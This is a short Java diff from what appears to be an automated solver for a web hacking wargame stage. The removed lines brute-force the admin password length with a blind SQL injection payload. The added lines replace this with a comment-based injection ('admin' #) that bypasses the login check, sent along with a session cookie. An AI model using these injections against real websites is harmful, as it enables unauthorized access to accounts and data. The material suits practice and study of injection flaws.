@@ -14,22 +14,18 @@ public void run(){
 
 		try{
 			final String cookie_content = "PHPSESSID="+conf.getToken()+";";
-			int pwlen=-1;
 			String content="";
-			int lenhelper = 40;
-			while(pwlen==-1){
-				String sub_query = "?"+String.format("pw=%%27%%20or%%20length(pw)=%d%%20%s%%23",lenhelper,URLEncoder.encode(" and id='admin' "));
+				String sub_query = "?"+String.format("id=%s",URLEncoder.encode("admin' #"));
 				content=queryContent(conf,cookie_content,sub_query);
 				
 				if(isSuccess(content)){
-					pwlen=(lenhelper);
-					pwlen=lenhelper;
+					System.out.println("50% pass");
+					if(content.contains("Clear!")){
+						System.out.println("Stage clear!");
+					}
 					
 				}
-				else{
-					lenhelper++;
-				}
-			}
+				
 			
 		}
 		catch(Exception e){}
